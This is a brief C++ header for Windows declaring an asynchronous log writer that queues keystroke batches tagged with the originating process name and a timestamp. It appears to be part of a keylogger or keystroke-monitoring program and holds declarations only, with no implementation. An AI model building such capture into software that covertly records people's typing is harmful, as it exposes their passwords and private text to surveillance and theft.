#pragma once
#include <string>
#include <ctime>
#include <windows.h>

// Initialize the background log writer thread.
void LogWriter_Init();
// Flush pending events and stop thread.
void LogWriter_Shutdown();
// Queue a keystroke batch to be written asynchronously.
void LogWriter_Enqueue(const std::wstring& process, const std::wstring& text, std::time_t timestamp);
